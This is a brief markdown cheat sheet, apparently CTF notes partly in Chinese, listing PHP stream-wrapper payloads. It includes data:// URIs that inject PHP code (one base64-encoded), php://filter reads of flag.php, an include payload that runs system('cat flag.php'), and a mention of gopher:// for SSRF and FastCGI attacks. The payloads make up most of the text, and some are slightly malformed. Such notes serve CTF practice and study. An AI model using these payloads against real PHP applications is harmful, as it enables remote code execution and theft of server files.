| Protocol      | desc                               | payload                                                                       |
| ------------- | ---------------------------------- | ----------------------------------------------------------------------------- |
| data://       | bypass file_get_contents($text...) | ?text=data://test/plain,welcome&file=php://filter/resource=useless.php        |
|               |                                    | ?text=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==                   |
| glob://       | 搜索目录                           |                                                                               |
| php://filter/ | 读文件                             | php://filter/convert.base64-encode/resource=flag.php                          |
|               |                                    | `?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php` |
|               |                                    | `?c=include$_GET[1]?>&1=data://text/plains,<?php system("cat flag.php");?>")` |
| gopher://     | ssrf 攻击常用                      |

# gopher 攻击

CTFHUB FastCGI 协议
